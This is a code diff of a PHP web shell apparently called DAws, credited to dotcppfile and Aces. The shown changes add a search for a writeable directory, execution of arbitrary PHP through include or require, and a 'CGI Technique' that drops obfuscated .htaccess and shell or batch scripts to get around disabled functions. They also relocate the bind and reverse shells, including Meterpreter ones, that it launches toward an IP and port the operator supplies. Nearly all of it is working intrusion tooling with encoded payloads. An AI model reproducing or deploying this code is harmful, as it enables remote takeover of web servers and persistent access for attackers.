@@ -3,6 +3,7 @@
 #Credits:
 #	dotcppfile & Aces
 
+session_cache_limiter('nocache');
 session_start();
 ob_start();
 
@@ -76,6 +77,81 @@ function generateRandomString($length = 10)
 if (!isset($_SESSION['key']))
 {
 	$_SESSION['key'] = generateRandomString();
+}
+#<--
+
+#Find a Writeable/Readable Dir-->
+$parts = explode("/", $_SERVER['PHP_SELF']);
+$dirNumber = count($parts) - 2;
+
+$current = getcwd();
+$parts2 = explode("/", $current);
+
+for ($i=0; $i<$dirNumber; $i++)
+{
+	unset($parts2[count($parts2) -1]);
+}
+
+$real_path = "";
+for ($i=0; $i<count($parts2); $i++)
+{
+	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
+	{
+		$real_path .= $parts2[$i].'\\';
+	}
+	else
+	{
+		$real_path .= $parts2[$i].'/';
+	}
+}
+
+$paths = getPaths($real_path);
+$writeread_dir  = "";
+foreach($paths as $path)
+{
+	if((is_writable("$real_path$path")) && (is_readable("$real_path$path")))
+	{
+		$writeread_dir  = "$real_path$path";
+		break;
+	}
+}
+if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
+{
+	$writeread_dir  .= "\\"; 
+}
+else
+{
+	$writeread_dir  .= "/"; 
+}
+
+function getPaths($root)
+{
+	$blacklist_paths = array("../", "./", ".../");
+	$whitelist_paths = array();
+	$iter = new RecursiveIteratorIterator(
+		new RecursiveDirectoryIterator($root, RecursiveDirectoryIterator::SKIP_DOTS),
+		RecursiveIteratorIterator::SELF_FIRST,
+		RecursiveIteratorIterator::CATCH_GET_CHILD
+	);
+
+	$paths = array($root);
+	foreach ($iter as $path => $dir)
+	{
+		if ($dir->isDir())
+		{
+			$path = str_replace($root, "", $path);
+			foreach($blacklist_paths as $blacklist)
+			{
+				$path = str_replace($blacklist, "", $path);
+			}
+			
+			if(!empty($path) && !in_array($path, $whitelist_paths))
+			{
+				$whitelist_paths[] = $path;
+			}
+		}
+	}
+	return $whitelist_paths;
 }
 #<--
 
@@ -283,6 +359,11 @@ function rrmdir($dir)
 		}
 		reset($objects);
 		rmdir($dir);
+		return True;
+	}
+	else
+	{
+		return False;
 	}
 }
 #<--
@@ -568,25 +649,45 @@ End Sub';
 }
 #<--
 
-#PHP Eval (using include)-->
+#PHP Eval (using include, include_once, require or require_once)-->
 function runPHP($code)
 {
-	if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
+	global $writeread_dir;
+
+	$filename = rand(1, 1000) . ".php";
+	file_put_contents($writeread_dir  . $filename, $code);
+	
+	if (checkIt("include"))
 	{
-		$tmp = "";
+		include($writeread_dir  . $filename);
+	}
+	else if (checkIt("include_once"))
+	{
+		include_once($writeread_dir  . $filename);
+	}
+	else if (checkIt("require"))
+	{
+		require($writeread_dir  . $filename);
+	}
+	else if(checkIt("require_once"))
+	{
+		require_once($writeread_dir  . $filename);
 	}
 	else
 	{
-		$tmp = "/tmp/";
+		echo "<p class='danger'>`include`, `include_once`, `require` and `require_once` are all Disabled.</p>";
 	}
-	
-	$filename = rand(1, 1000) . ".php";
-	file_put_contents($tmp . $filename, $code);
-	
-	include($tmp . $filename);
 
-	unlink($tmp . $filename);
+	unlink($writeread_dir  . $filename);
 }
+#<--
+
+#CGI Essentials-->
+$htaccess="bi4QBzgRCA0AABZPFwQZXRUKHgwUG1RNAxhGRw4EEGU7EwQZCQcfRU8qDAYTMyEgZg==";
+
+$cgish="R05bARkeSQsNFgxlfgYTGAlJTiYLAQAGHgRLHRUVAVVUFxUIEkYEEQkDVmkVEw4GTEdGZX4GExgJSU5ZDBsZD056WgEJBABRfl8EGRIFCVsgLgMQUF1GKissRC0VEBhQNQEJCQhTWxcZBAoMUm9YQBwGERRYY1AHCwsNXXpMBQwCEQEdSmlMGFJXKCQTHFROUDMhIEwnBRwcQyMYAwUAWUsHQF1SemwMDw0LT1ZpTBYJGwFFBQwACh8eW04oJBMcWhAYV0YECREMABBeVzcjPUtbbmZIFxESCgxSb21mSBcUTiUGAQgFARBZUExJHQhbbmZ9XwQUWFUFCxQaAEMECRYMUUIQCgwXV1AICAEAWUgXDB0dBwcIQlpTWxcUTmxgZVkQC0pfGR4WHBhFEBYEBk1XFRwOCA0bU0MeEQsMUUIjAFNDBhEKHAlYQygbRF9OWkYYAVplfV9fBAcLAABaZUhMFh8UBFJHX2V+AB8dCwgCAVkPEQAYH0ZLSDQxKiY6LyMyOyUrI01UH1ADAw1MSApPUxBfLkhDDwoJAhUNFE06QTc7QjJeP1leTE1DOVVABERQDEYaCQFETQdMVUJWRkxKA01UH1ADAw1MRxdAX0xQXwFLDG8BGRUPUFQFBgEIBQEQaXoVBQEDRUZTWwAVHhIMHltuU1sBHxQfV2ZZSwcADhxORA==";
+
+$cgibat="JAoXCx9QCQ8Kb24KFwsfUCUGAhEBAQBOBAkWDFZFEAoMF18YEgQAbwEMHAxQXmxjCQYMAFQ9TBgSBAA7WjFICxURAjdSO1gbHRccFThXKCQTHFROUDMhIEwnBRsXC1AjDgwACTpTWxcZBAoMMls6U1sLFRECN1I7WA0bBwkuWDdQBgEBAAYCLlg3UA1QMUonMQcVSUFFJyg9QzIREgoERTcHEQ8cLlpGBFE6USpfFh8UBEwEBxsdDB5NQS0tEhdBFgIEV0YECREMABBeVzcjPUs7WjFIFxESCgwyWzpTAAcuTiUGAQgFARBZUC5aRhgBOlEqXwQUOFcyWQ0BBBYEUBIQHABZSAAGCARBSQIECQpJRBMfCwQNCwBIKl0uTEkdCDtaMUgXFC5YN1AMCh8BF1AEHxkJWEMcAQEdGRJOTAsFAhFeVzcJTkwTBQMBBk1XIQZLSjpRKl9fBAI3UjtYQAACEhwDN1I7WEASDAIdOFdmb24GEkM+PzJJTkA1OjExKS81PT4sKihRQVBNW0lOR25HfmpVITMsPjw7PCAxOT4hUxJdQWVdaXoVBQEDRTpTWwAVHhIMHjtaMUhMEh8CEDJbOlNbCwQdCjdS";
 #<--
 
 #Encrypted Shells and Tools--> 
@@ -604,11 +705,37 @@ $bpscan = "bkxVTAUDFEYODApAEQ0GUBYQGA0LAUZpehkLGQMXEE8BERwcDwteSUQaBg8cGQRFTBYdH
 
 $bpscanp =
 "blNLExgAbGMKChZHUApQTUZYXFdQVFRHGVBaSVpQUVxDWFBUD0JHTG4UfmpUEwkHAgAHGx0MHlBbSSwDFwAXCB8AAwdER1VdQ01AXlZHXUdIT1AKWUtsYGZsDQlUSxkDORsJFgsaBgAVWEIKAwsKChcXGR8IQEVvbRR+ankZAEEFAzQABhc/AAMHREENRl1peXkdY2VsbUsACh0VRlRMAQUbEUtSKUsEQQFEJ04KSgNEQFdvbWZ9BRkcAzYcEBAwFwweBAMHGBZMTRYTAxMHB0xIRB8bEQQDSB0UEUZDVEErVBIAAQA5TyQsIiRGJjwgKlVURxksCEtARSImOCYvMTY5KSsgRk9peXlvDw8JCxwRS1QTCQcCAAcbHQweWV1jZWwZZX1qFRwVDGZsbRR+anl5Qh0FCAFPSUMUERIMREc9QhlOFFAuUwVfF01dWHp5b2AKDAgKKxMFBDkKAwsQChoXA1hECxwWBw4aQ11QAxseChYcWhcIBERFTEc/SwAKHRU7STwqNjtULCA1KEkuMDBPOiwkUCc/LSwoLTgmUDU+PSk3Ki44LylKRk0FOQpNWEM2OSosMyQ0PzEtNFldY2VsGWV9HnoNbGMKEAoMAAofHkYACjULHQAsABUIQUgVCx0ASnoLbGBIEBYDVF5QUg4dGBVeQFsUBwdICg0LHQABEBUVCwxCChYIW0FLem9NDw1EUlQABQIKNgULDRtcSkt6bwoZFwgwBwYEHxYdREEHB1ggJSIqJjwxOzomL1xQQhweCU1UfmoTBRQFMxYBGxsTBFhCCgRJJzomLz8gMjY8Kjc7Mio1PCI6QEVGHxsRBE1CGQMXEEkdE01BX1tCVFJXWlJeRERAV29tDAERHC8VDBgKFBtcRxMYSkkvMDYjOzMkLzQsODA2ISAxMT41Lyk3SE8AEQUVT1JmbEAHAA4cUFtJDxAWAysGCBUFQUgGDEZPaXkTExsAOgcDGxAVWEIKBExfZX0KFlgVHR4VCxxcRxgECwVARUYsGw0eFQUdBQoKTwAKHRUCSQMQEE1dXk1NAAgAFgFGfmoLem9gHgAQGgYNUAQUHAlebmYJaXkVChoJRW5mD2l5eRQMGBAWAVQFERwVDFdvbRJ+Hnp6WVdm";
+#<--
 
+#Dynamic Booleans (True=Enabled/False=Disabled)-->
+$php_functions = array("exec", "shell_exec", "passthru", "system", "popen", "proc_open", "curl_version");
+foreach($php_functions as $function)
+{
+	if(checkIt($function))
+	{
+		${"{$function}"} = True;
+	}	
+	else
+	{
+		${"{$function}"} = False;
+	}
+}
+
+$softwares = array("nohup");
+foreach($softwares as $function)
+{
+	if(soft_exists($function))
+	{
+		${"{$function}"} = True;
+	}	
+	else
+	{
+		${"{$function}"} = False;
+	}
+}
 #<--
 
 ?>
-
 
 <!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Strict//EN'
 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd'>
@@ -716,7 +843,9 @@ $bpscanp =
 		margin-top: 10px;
 		margin-bottom: 10px;
 		width: 505px;
+		max-width: 505px;
 		height: 335px;
+		max-height: 335px;
 	}
 	.flat-table-3 {
 		text-align: center;
@@ -742,6 +871,11 @@ $bpscanp =
 	.fButton {
 		position: fixed;
 		top: 0;
+		right: 0;
+	}
+	.lowTab {
+		position: fixed;
+		bottom: 0;
 		right: 0;
 	}
 </style>
@@ -919,66 +1053,16 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 	</form>
 </div>
 
+<div class="lowTab">
+	<form action='?action=cgi' method='post'>
+		<input type='submit' value='CGI Technique' name='CGI Technique'/>
+	</form>
+</div>
+
 <br><h3><A NAME='Information' href="#Information">Information</A></h3>
 
 <table>
 <tr>
-<td>
-<table class='flat-table flat-table-2'>
-	<tr>
-		<th>Useful Function</th>
-		<th>Status</th>
-	</tr>
-	<?php
-	
-	#--> Checks if the functions are Enabled and Disabled
-	$php_functions = array("exec", "shell_exec", "passthru", "system", "popen", "proc_open", "curl_version");
-	
-	foreach($php_functions as $function)
-	{
-		echo "
-		<tr>
-			<td>$function</td>";
-		if(checkIt($function))
-		{
-			${"{$function}"} = True;
-			echo "
-			<td><font color='green'>ENABLED</font></td>
-			</tr>";
-		}	
-		else
-		{
-			${"{$function}"} = False;
-			echo "
-			<td><font color='red'>DISABLED</font></td>
-			</tr>";
-		}
-	}
-
-	
-	echo "
-		<tr>
-			<td>nohup</td>";
-	if (soft_exists("nohup") != "")
-	{
-		$nohup = True;
-		echo "
-			<td><font color='green'>ENABLED</font></td>";
-	}
-	else
-	{
-		$nohup = False;
-		echo "
-			<td><font color='red'>DISABLED</font></td>";	
-	}
-
-	echo "
-		</tr>";
-	#<--
-
-	?>
-</table>
-</td>
 <td>
 <table class='flat-table flat-table-2'>
 	<tr>
@@ -988,7 +1072,6 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 
 	<?php
 	
-	#Gets Info -->
 	if(checkIt("php_uname"))
 	{
 		echo "
@@ -1090,9 +1173,13 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 				{
 					$first = str_replace("\"", "", $get_first[2]);
 					if(isset($first[0]))
+					{
 						echo "<td>".round(explode("\n", $first)[0])."% </td>";
-					else 
+					}					
+					else
+					{ 
 						echo "N/A";
+					}				
 				}
 				else 
 				{
@@ -1115,9 +1202,13 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 				{
 					$first = str_replace("\"", "", $get_first[2]);
 					if(isset($first[0]))
+					{
 						echo "<td>".round(explode("\n", $first[0]))."% </td>";
-					else 
+					}					
+					else
+					{ 
 						echo "N/A";
+					}				
 				}
 				else 
 				{
@@ -1142,9 +1233,13 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 				{
 					$first = str_replace("\"", "", $get_first[2]);
 					if(isset($first[0]))
+					{
 						echo "<td>".round(explode("\n", $first[0]))."% </td>";
-					else 
+					}					
+					else
+					{ 
 						echo "N/A";
+					}				
 				}
 				else 
 				{
@@ -1182,27 +1277,32 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 				}
 				else
 				{
-			$parts = explode(",", $stdout);
-			if(isset($parts[2]))
-			{
-				$get_first = explode(",", $data);
-				if(isset($get_first[2]))
-				{
-					$first = str_replace("\"", "", $get_first[2]);
-					if(isset($first[0]))
-						echo "<td>".round(explode("\n", $first[0]))."% </td>";
+					$parts = explode(",", $stdout);
+					if(isset($parts[2]))
+					{
+						$get_first = explode(",", $data);
+						if(isset($get_first[2]))
+						{
+							$first = str_replace("\"", "", $get_first[2]);
+							if(isset($first[0]))
+							{
+								echo "<td>".round(explode("\n", $first[0]))."% </td>";
+							}							
+							else
+							{ 
+								echo "N/A";
+							}						
+						}
+						else 
+						{
+							echo "N/A";
+						}
+					}
 					else 
+					{
 						echo "N/A";
+					}
 				}
-				else 
-				{
-					echo "N/A";
-				}
-			}
-			else 
-			{
-				echo "N/A";
-			}					}
 			}
 			else
 			{
@@ -1433,12 +1533,35 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 	</tr>";
 	#<--
 
-	?>
+$ip = $_SERVER['REMOTE_ADDR'];
+$agent = $_SERVER['HTTP_USER_AGENT'];
+
+echo "
+</table>
+</td>
+<td>
+<table class='flat-table flat-table-2'>
+	<tr>
+		<th>Name</th>
+		<th>Value</th>
+	</tr>
+	<tr>
+		<td>Your IP</td>
+		<td>$ip</td>
+	</tr>
+	<tr>
+		<td>Your UA</td>
+		<td>$agent</td>
+	</tr>
+	<tr>
+		<td>Writeable/Readable Dir</td>
+		<td>$writeread_dir</td>
+	</tr>
 </table>
 </td>
 </tr>
-</table>
-
+</table>";
+?>
 <br><h3><A NAME='File Manager' href='#File Manager'>File Manager</A></h3>
 
 <?php
@@ -1472,7 +1595,7 @@ if(isset($_FILES["fileToUpload"]))
 		if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file))
 		{
 			echo "<p class='success'>The file ".basename($_FILES["fileToUpload"]["name"])." has been uploaded.</p>";
-			header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]);
+			header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]."#File Manager");
 		}
 		else
 		{
@@ -1535,7 +1658,7 @@ else if(isset($_POST["linkToDownload"]))
 				}
 
 				echo "<p class='success'>The file ".$filename." has been uploaded.</p>";
-				header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]);
+				header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]."#File Manager");
 			}
 			catch(Exception $e)
 			{
@@ -1567,7 +1690,7 @@ else if(isset($_POST["mkdir"]))
 	if (!file_exists($dirname))
 	{
 		mkdir($dirname);
-		header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]);
+		header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]."#File Manager");
 	}
 	else
 	{
@@ -1593,7 +1716,7 @@ else if(isset($_POST["mkfile"]))
 	if (!file_exists($filename))
 	{
 		fopen($filename, 'w');
-		header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]);
+		header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]."#File Manager");
 	}
 	else
 	{
@@ -1608,26 +1731,26 @@ else if(isset($_GET["del"]))
 	echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a>";
 	if (is_dir(unxor_this($_GET["del"])))
 	{
-		if (rrmdir(unxor_this($_GET["del"])) == FALSE)
+		if (rrmdir(unxor_this($_GET["del"])) == False)
 		{
 			echo "<p class='danger'>".unxor_this($_GET["del"])." cannot be Deleted.</p>";
 		}
 		else
 		{
 			echo "<p class='success'>".unxor_this($_GET["del"])." has been Deleted.</p>";
-			header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]);
+			header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]."#File Manager");
 		}
 	}
 	else
 	{
-		if (unlink(unxor_this($_GET["del"])) == FALSE)
+		if (unlink(unxor_this($_GET["del"])) == False)
 		{
 			echo "<p class='danger'>".unxor_this($_GET["del"])." cannot be Deleted.</p>";
 		}
 		else
 		{
 			echo "<p class='success'>".unxor_this($_GET["del"])." has been Deleted.</p>";
-			header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]);
+			header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]."#File Manager");
 		}
 	}	
 }
@@ -1675,7 +1798,7 @@ else if(isset($_GET["zip"]))
 				if ($zipFail == False)
 				{
 					echo "<p class='success'>".unxor_this($_GET["zip"])." has been Ziped.</p>";
-					header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]);
+					header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]."#File Manager");
 				}	
 			}
 		}
@@ -1745,7 +1868,7 @@ else if(isset($_GET["rename_file"]) && !empty($_GET["rename_file"]))
 			if(file_exists(unxor_this($_POST["new_name"])))
 			{
 				echo "<p class='success'>File successfully renamed!</p>";
-				header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["dir"]);
+				header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["dir"]."#File Manager");
 			}
 			else
 			{
@@ -1776,7 +1899,7 @@ else if(isset($_GET["rename_folder"]) && !empty($_GET["rename_folder"]))
 			rename(unxor_this($_POST["original_name"]), unxor_this($_POST["new_name"]));
 			if(file_exists(unxor_this($_POST["new_name"])))
 			{
-				header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["dir"]);			
+				header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["dir"]."#File Manager");
 				echo "<p class='success'>File successfully renamed!</p>";
 			}
 			else
@@ -1959,10 +2082,15 @@ else
 							<td>".getPermission($topdir)."</td>";
 						if ($file_type == "dir")
 						{
-							if (is_writeable($topdir))
+							if ((is_writeable($topdir)) && (is_readable($topdir)))
 							{
 								echo "
 								<td><a href='".$_SERVER['PHP_SELF']."?del=".xor_this($topdir)."&location=".xor_this($dir)."#File Manager'>Del</a> | <a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&rename_folder=".xor_this($topdir)."#File Manager'>Rename</a> | <a href='".$_SERVER['PHP_SELF']."?zip=".xor_this($topdir)."&location=".xor_this($dir)."#File Manager'>Zip</a></td>";
+							}
+							else if (is_writeable($topdir))
+							{
+								echo "
+								<td><a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&rename_folder=".xor_this($topdir)."#File Manager'>Rename</a> | <a href='".$_SERVER['PHP_SELF']."?zip=".xor_this($topdir)."&location=".xor_this($dir)."#File Manager'>Zip</a></td>";
 							}
 							else
 							{
@@ -1972,7 +2100,7 @@ else
 						}
 						else
 						{
-							if (is_readable($topdir) && is_writeable($topdir))
+							if ((is_readable($topdir)) && (is_writeable($topdir)))
 							{
 								echo "
 								<td><a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&download=".$rows[$i]['data']."&location=".xor_this($topdir)."'>Download File</a> | <a href='".$_SERVER['PHP_SELF']."?file=".xor_this($topdir)."#File Manager'>Edit</a> | <a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&rename_file=".xor_this($topdir)."#File Manager'>Rename</a> | <a href='".$_SERVER['PHP_SELF']."?del=".xor_this($topdir)."&location=".xor_this($dir)."#File Manager'>Del</a></td>";
@@ -1986,7 +2114,7 @@ else
 							{
 								echo "
 								<td><a href='".$_SERVER['PHP_SELF']."?file=".xor_this($topdir)."#File Manager'>Edit</a> | <a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&rename_file=".xor_this($topdir)."#File Manager'>Rename</a> | <a href='".$_SERVER['PHP_SELF']."?del=".xor_this($topdir)."&location=".xor_this($dir)."#File Manager'>Del</a></td>";
-							}							
+							}					
 							else
 							{
 								echo "
@@ -2411,7 +2539,7 @@ if(isset($_POST["run"]))
 			{
 				if ($python != "")
 				{
-					$filename = rand(1,1000) . ".py";
+					$filename = $writeread_dir .rand(1,1000) . ".py";
 					file_put_contents($filename, $decEval);
 					$command = "$python $filename";
 					evalRel($command);
@@ -2423,7 +2551,7 @@ if(isset($_POST["run"]))
 			{
 				if ($ruby != "")
 				{
-					$filename = rand(1,1000) . ".rb";
+					$filename = $writeread_dir .rand(1,1000) . ".rb";
 					file_put_contents($filename, $decEval);
 					$command = "$ruby $filename";
 					evalRel($command);
@@ -2435,7 +2563,7 @@ if(isset($_POST["run"]))
 			{
 				if ($perl != "")
 				{
-					$filename = rand(1,1000) . ".pl";
+					$filename = $writeread_dir .rand(1,1000) . ".pl";
 					file_put_contents($filename, $decEval);
 					$command = "$perl $filename";
 					evalRel($command);
@@ -2447,7 +2575,7 @@ if(isset($_POST["run"]))
 			{
 				if ($powershell != "")
 				{
-					$filename = rand(1,1000)."ps1";
+					$filename = $writeread_dir .rand(1,1000)."ps1";
 					file_put_contents($filename, $decEval);
 					$command = "$powershell -executionpolicy remotesigned -File $filename";
 					evalRel($command);
@@ -2457,7 +2585,7 @@ if(isset($_POST["run"]))
 
 			if($_POST["language"] == "batch")
 			{
-				$filename = rand(1,1000)."bat";
+				$filename = $writeread_dir .rand(1,1000)."bat";
 				file_put_contents($filename, $decEval);
 				$command = $filename;
 				evalRel($command);
@@ -2468,7 +2596,7 @@ if(isset($_POST["run"]))
 		{
 			if($_POST["language"] == "python")
 			{
-				$filename = "/tmp/".rand(1,1000).".py";
+				$filename = $writeread_dir .rand(1,1000).".py";
 				file_put_contents($filename, $decEval);
 				$command = "python $filename 2>&1";
 				evalRel($command);
@@ -2477,7 +2605,7 @@ if(isset($_POST["run"]))
 
 			if($_POST["language"] == "ruby")
 			{
-				$filename = "/tmp/".rand(1,1000).".rb";
+				$filename = $writeread_dir .rand(1,1000).".rb";
 				file_put_contents($filename, $decEval);
 				$command = "ruby $filename 2>&1";
 				evalRel($command);
@@ -2486,7 +2614,7 @@ if(isset($_POST["run"]))
 
 			if($_POST["language"] == "perl")
 			{
-				$filename = "/tmp/".rand(1,1000).".pl";
+				$filename = $writeread_dir .rand(1,1000).".pl";
 				file_put_contents($filename, $decEval);
 				$command = "perl $filename 2>&1";
 				evalRel($command);
@@ -2496,7 +2624,7 @@ if(isset($_POST["run"]))
 
 			if($_POST["language"] == "bash")
 			{
-				$filename = "/tmp/".rand(1,1000).".sh";
+				$filename = $writeread_dir .rand(1,1000).".sh";
 				file_put_contents($filename, $decEval);
 				$command = "$filename 2>&1";
 				evalRel("chmod u=rx $filename");
@@ -2506,7 +2634,7 @@ if(isset($_POST["run"]))
 
 			if($_POST["language"] == "c")
 			{
-				$filename = "/tmp/".rand(1,1000);
+				$filename = $writeread_dir .rand(1,1000);
 				file_put_contents("$filename.c", $decEval);
 				$command = "g++ $filename.c -o $filename";
 				evalRel($command);
@@ -2518,7 +2646,7 @@ if(isset($_POST["run"]))
 
 			if($_POST["language"] == "cpp")
 			{
-				$filename = "/tmp/".rand(1,1000);
+				$filename = $writeread_dir .rand(1,1000);
 				file_put_contents("$filename.cpp", $decEval);
 				$command = "g++ $filename.cpp -o $filename";
 				evalRel($command);
@@ -2874,16 +3002,7 @@ if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "bps"))
 	$phpbindshell = unsh3ll_this($phpbindshell);
 	$phpbindshell = str_replace("\$port=4444;", "\$port=$port;", $phpbindshell);
 	
-	$filename = rand(1,1000) . ".php";
-
-	if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
-	{
-		$filename = $filename;
-	}			
-	else
-	{
-		$filename = "/tmp/".$filename;
-	}
+	$filename = $writeread_dir .rand(1,1000) . ".php";
 
 	file_put_contents($filename, $phpbindshell);
 	if ($nohup == True)
@@ -2929,16 +3048,7 @@ if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "rps"))
 	$phpreverseshell = str_replace("\$port=4444;", "\$port=$port;", $phpreverseshell);
 	$phpreverseshell = str_replace("\$ipaddr='192.168.1.104';", "\$ipaddr='".$_POST['ip']."';", $phpreverseshell);
 
-	$filename = rand(1,1000) . ".php";
-
-	if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
-	{
-		$filename = $filename;
-	}			
-	else
-	{
-		$filename = "/tmp/".$filename;
-	}
+	$filename = $writeread_dir .rand(1,1000) . ".php";
 
 	file_put_contents($filename, $phpreverseshell);
 	if ($nohup == True)
@@ -2982,16 +3092,7 @@ if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "bmps"))
 
 	$meterpreterbindshell = unsh3ll_this($meterpreterbindshell);
 	$meterpreterbindshell = str_replace("\$port = 4444;", "\$port = $port;", $meterpreterbindshell);
-	$filename = rand(1,1000) . ".php";
-
-	if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
-	{
-		$filename = $filename;
-	}		
-	else
-	{
-		$filename = "/tmp/".$filename;
-	}
+	$filename = $writeread_dir .rand(1,1000) . ".php";
 
 	file_put_contents($filename, $meterpreterbindshell);
 	if ($nohup == True)
@@ -3036,16 +3137,7 @@ if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "rmps"))
 	$meterpreterreverseshell = unsh3ll_this($meterpreterreverseshell);
 	$meterpreterreverseshell = str_replace("\$port = 4444;", "\$port = $port;", $meterpreterreverseshell);
 	$meterpreterreverseshell = str_replace("\$ip = '192.168.1.104';", "\$ip = '".$_POST['ip']."';", $meterpreterreverseshell);
-	$filename = rand(1,1000) . ".php";
-
-	if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
-	{
-		$filename = $filename;
-	}			
-	else
-	{
-		$filename = "/tmp/".$filename;
-	}
+	$filename = $writeread_dir .rand(1,1000) . ".php";
 
 	file_put_contents($filename, $meterpreterreverseshell);
 	if ($nohup == True)
@@ -3090,16 +3182,7 @@ if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "sc"))
 	$serbotclient = unsh3ll_this($serbotclient);
 	$serbotclient = str_replace("port = 4444", "port = $port", $serbotclient);
 	$serbotclient = str_replace("host = \"192.168.1.4\"", "host = \"".$_POST['ip']."\"", $serbotclient);
-	$filename = rand(1,1000) . ".py";
-
-	if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
-	{
-		$filename = $filename;
-	}			
-	else
-	{
-		$filename = "/tmp/".$filename;
-	}
+	$filename = $writeread_dir .rand(1,1000) . ".py";
 
 	file_put_contents($filename, $serbotclient);
 	if ($nohup == True)
@@ -3180,6 +3263,34 @@ if(isset($_GET["tool"]) && ($_GET["tool"] == "bpscanp"))
 			runPHP($bpscanp);
 		}
 		unlink($filename);
+	}
+}
+#<--
+
+#CGI Technique-->
+if(isset($_GET["action"]) && ($_GET["action"] == "cgi"))
+{
+	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
+	{
+		mkdir($writeread_dir."cgi");
+
+		file_put_contents($writeread_dir."cgi\\.htaccess",unsh3ll_this($htaccess));
+
+		file_put_contents($writeread_dir."cgi\\DAws.bat",unsh3ll_this($cgibat));
+		chmod($writeread_dir."cgi\\DAws.bat", 0755);
+
+		header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".xor_this($writeread_dir."cgi")."#File Manager");
+	}
+	else
+	{
+		mkdir($writeread_dir."cgi");
+
+		file_put_contents($writeread_dir."cgi/.htaccess",unsh3ll_this($htaccess));
+
+		file_put_contents($writeread_dir."cgi/DAws.sh",unsh3ll_this($cgish));
+		chmod($writeread_dir."cgi/DAws.sh", 0755);
+
+		header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".xor_this($writeread_dir."cgi")."#File Manager");
 	}
 }
 #<--
